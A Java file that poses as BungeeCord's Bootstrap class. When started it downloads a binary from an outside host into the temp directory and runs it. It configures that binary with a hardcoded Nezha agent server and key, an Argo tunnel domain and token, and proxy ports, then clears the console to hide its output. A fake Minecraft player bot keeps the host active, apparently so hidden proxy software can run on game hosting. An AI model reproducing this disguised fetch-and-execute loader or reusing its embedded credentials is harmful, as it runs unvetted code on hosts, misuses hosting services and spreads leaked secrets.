package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    // ==================== 1.21.4 (Protocol 774) 协议修正 ====================
    // KeepAlive: 0x18 (标准 1.21.4 心跳包)
    // Rotation:  0x1F (转头)
    // Swing:     0x3D (挥手)
    private static final int PACKET_SB_KEEPALIVE = 0x18;
    private static final int PACKET_SB_ROTATION = 0x1F;
    private static final int PACKET_SB_SWING = 0x3D;
    // ======================================================================

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process minecraftProcess;
    private static Thread fakePlayerThread;
    
    // 环境变量定义放最前面，防止结构错误
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ACTIVITY"
    };

    public static void main(String[] args) throws Exception
    {
        // 启动标志，用于确认代码是否更新
        System.out.println(ANSI_GREEN + "=== BOOTSTRAP 1.21.4 FIX V5 ===" + ANSI_RESET);

        try {
            Map<String, String> config = loadEnvVars();
            
            // 1. 启动 SBX
            runSbxBinary(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread() {
                public void run() {
                    running.set(false);
                    stopServices();
                }
            });

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
            
            // 2. 启动 MC
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(30000);
            }
            
            // 3. 启动假人
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBot(config);
            }
            
            System.out.println(ANSI_GREEN + "\nScript finished. Logs deleting in 20s...\n" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

        } catch (Exception e) {
            e.printStackTrace();
        }

        while (running.get()) {
            try { Thread.sleep(10000); } catch (InterruptedException e) { break; }
        }
    }
    
    // ==================== 核心逻辑方法 ====================

    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        Map<String, String> env = pb.environment();
        // 兼容性写法
        for (String key : envVars.keySet()) {
            env.put(key, envVars.get(key));
        }
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }
    
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        
        // 默认配置
        envVars.put("UUID", "1f6b80fe-023a-4735-bafd-4c8512bf7e58");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "cloudb.lnb.gv.uy");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiODJiMzY3OGYtYjdmMC00NjY5LThjNmMtOWJjNzBkODZjOGM0IiwicyI6Ik5qZGhNbVJsTlRjdFltRmtNUzAwTWpneUxXRmlORFF0TTJWbVltUXpPR05oTkRneSJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "15017");
        envVars.put("FAKE_PLAYER_ENABLED", "true");
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        envVars.put("FAKE_PLAYER_ACTIVITY", "high");
        
        // 系统变量覆盖
        for (int i = 0; i < ALL_ENV_VARS.length; i++) {
            String key = ALL_ENV_VARS[i];
            String val = System.getenv(key);
            if (val != null && !val.trim().isEmpty()) envVars.put(key, val);
        }
        
        // .env 文件加载
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            BufferedReader reader = Files.newBufferedReader(envFile);
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String k = parts[0].trim();
                    String v = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    envVars.put(k, v);
                }
            }
            reader.close();
        }
        return envVars;
    }
    
    private static void startFakePlayerBot(Map<String, String> config) {
        final String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        final int mcPort = getMcPort(config);
        final String activityLevel = config.getOrDefault("FAKE_PLAYER_ACTIVITY", "high");
        
        fakePlayerThread = new Thread(new Runnable() {
            public void run() {
                while (running.get()) {
                    Socket socket = null;
                    try {
                        System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting to port " + mcPort + "..." + ANSI_RESET);
                        socket = new Socket();
                        socket.setReceiveBufferSize(1024 * 1024);
                        socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                        socket.setSoTimeout(30000);
                        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                        DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
                        
                        // Handshake
                        sendPacketRaw(out, createHandshakePacket(mcPort));
                        // Login
                        sendPacketRaw(out, createLoginPacket(playerName));
                        
                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login sent" + ANSI_RESET);
                        
                        boolean compression = false;
                        int threshold = -1;
                        boolean playPhase = false;
                        long lastTime = System.currentTimeMillis();
                        int actions = 0;
                        
                        while (running.get() && !socket.isClosed()) {
                            int len = readVarInt(in);
                            byte[] data = new byte[len];
                            in.readFully(data);
                            
                            // Decompress if needed
                            byte[] packetData = data;
                            if (compression) {
                                DataInputStream wrapper = new DataInputStream(new ByteArrayInputStream(data));
                                int dataLen = readVarInt(wrapper);
                                if (dataLen != 0) {
                                    byte[] compressed = new byte[len - getVarIntSize(dataLen)];
                                    wrapper.readFully(compressed);
                                    java.util.zip.Inflater inflater = new java.util.zip.Inflater();
                                    inflater.setInput(compressed);
                                    packetData = new byte[dataLen];
                                    inflater.inflate(packetData);
                                    inflater.end();
                                } else {
                                    packetData = new byte[len - 1];
                                    wrapper.readFully(packetData);
                                }
                            }
                            
                            DataInputStream pIn = new DataInputStream(new ByteArrayInputStream(packetData));
                            int pid = readVarInt(pIn);
                            
                            // Protocol Logic
                            if (!playPhase) {
                                if (pid == 0x03) { // Compression
                                    threshold = readVarInt(pIn);
                                    compression = threshold >= 0;
                                    System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + threshold + ANSI_RESET);
                                } else if (pid == 0x02) { // Login Success
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                    // Ack
                                    sendPacket(out, createAckPacket(), compression, threshold);
                                    // Client Info
                                    sendPacket(out, createClientInfoPacket(), compression, threshold);
                                } else if (pid == 0x03 && pIn.available() == 0) { // Login Play (Config Finish?)
                                    // 1.21.4 Config Finish is 0x03 in Config state (Clientbound)
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                    sendPacket(out, createAckPacket(), compression, threshold);
                                    playPhase = true;
                                }
                            } else {
                                // Play Phase
                                long now = System.currentTimeMillis();
                                
                                // KeepAlive (Serverbound 0x18, Clientbound 0x26/0x2B depending on version)
                                // We just check if payload is 8 bytes long
                                if (pIn.available() == 8) {
                                    long id = pIn.readLong();
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ♥ Heartbeat Val: " + id + " [Act:" + actions + "]" + ANSI_RESET);
                                    sendPacket(out, createKeepAlivePacket(id), compression, threshold);
                                    
                                    // Random Activity
                                    if (Math.random() > 0.5) {
                                        sendPacket(out, createSwingPacket(), compression, threshold);
                                        System.out.println(ANSI_YELLOW + "[FakePlayer] → Swung arm" + ANSI_RESET);
                                        actions++;
                                    } else {
                                        sendPacket(out, createRotationPacket(), compression, threshold);
                                        System.out.println(ANSI_YELLOW + "[FakePlayer] → Turned head" + ANSI_RESET);
                                        actions++;
                                    }
                                }
                                
                                // Prevent Idle
                                if (now - lastTime > 50000) {
                                    sendPacket(out, createSwingPacket(), compression, threshold);
                                    lastTime = now;
                                }
                            }
                        }
                        socket.close();
                        System.out.println(ANSI_RED + "[FakePlayer] Disconnected" + ANSI_RESET);
                        Thread.sleep(5000);
                    } catch (Exception e) {
                        System.out.println(ANSI_YELLOW + "[FakePlayer] Error: " + e.getMessage() + ", Retrying..." + ANSI_RESET);
                        try { Thread.sleep(10000); } catch (Exception ex) {}
                    }
                }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }

    // ==================== Packet Factory ====================
    
    private static byte[] createHandshakePacket(int port) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, 0x00);
        writeVarInt(d, 774);
        writeString(d, "127.0.0.1");
        d.writeShort(port);
        writeVarInt(d, 2);
        return b.toByteArray();
    }
    
    private static byte[] createLoginPacket(String name) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, 0x00);
        writeString(d, name);
        d.writeLong(0); d.writeLong(0); // UUID
        return b.toByteArray();
    }
    
    private static byte[] createAckPacket() throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, 0x03);
        return b.toByteArray();
    }
    
    private static byte[] createClientInfoPacket() throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, 0x00);
        writeString(d, "en_US");
        d.writeByte(10);
        writeVarInt(d, 0);
        d.writeBoolean(true);
        d.writeByte(127);
        writeVarInt(d, 1);
        d.writeBoolean(false);
        d.writeBoolean(true);
        return b.toByteArray();
    }
    
    private static byte[] createKeepAlivePacket(long id) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, PACKET_SB_KEEPALIVE); // 0x18
        d.writeLong(id);
        return b.toByteArray();
    }
    
    private static byte[] createSwingPacket() throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, PACKET_SB_SWING); // 0x3D
        writeVarInt(d, 0);
        return b.toByteArray();
    }
    
    private static byte[] createRotationPacket() throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, PACKET_SB_ROTATION); // 0x1F
        d.writeFloat((float)(Math.random() * 360));
        d.writeFloat(0);
        d.writeBoolean(true);
        return b.toByteArray();
    }

    // ==================== Utils ====================

    private static void sendPacketRaw(DataOutputStream out, byte[] data) throws IOException {
        writeVarInt(out, data.length);
        out.write(data);
        out.flush();
    }
    
    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress) {
            writeVarInt(out, packet.length);
            out.write(packet);
        } else {
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            if (packet.length < threshold) {
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
            } else {
                writeVarInt(bufOut, packet.length);
                // Simple compression stub
                java.util.zip.Deflater deflater = new java.util.zip.Deflater();
                deflater.setInput(packet);
                deflater.finish();
                byte[] c = new byte[packet.length]; // max
                int n = deflater.deflate(c);
                bufOut.write(c, 0, n);
            }
            byte[] finalData = buf.toByteArray();
            writeVarInt(out, finalData.length);
            out.write(finalData);
        }
        out.flush();
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        do {
            size++;
            value >>>= 7;
        } while (value != 0);
        return size;
    }
    
    private static void clearConsole() {
        try { System.out.print("\033[H\033[2J"); System.out.flush(); } catch (Exception e) {}
    }
    
    private static Path getBinaryPath() throws IOException {
        String url = System.getProperty("os.arch").contains("aarch64") ? "https://arm64.ssss.nyc.mn/sbsh" : "https://amd64.ssss.nyc.mn/sbsh";
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) { Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING); }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (minecraftProcess != null) minecraftProcess.destroy();
        if (sbxProcess != null) sbxProcess.destroy();
    }
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        return config.get("MC_JAR") != null;
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jar = config.get("MC_JAR");
        if(!Files.exists(Paths.get(jar))) return;
        Files.write(Paths.get("eula.txt"), "eula=true".getBytes());
        ProcessBuilder pb = new ProcessBuilder("java", "-Xmx" + config.getOrDefault("MC_MEMORY", "512M"), "-jar", jar, "nogui");
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();
        new Thread(() -> {
            try (BufferedReader r = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String l; while ((l = r.readLine()) != null) System.out.println("[MC-Server] " + l);
            } catch (IOException e) {}
        }).start();
    }
    
    private static int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.getOrDefault("MC_PORT", "25565")); } catch (Exception e) { return 25565; }
    }
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        return "true".equalsIgnoreCase(config.get("FAKE_PLAYER_ENABLED"));
    }
}
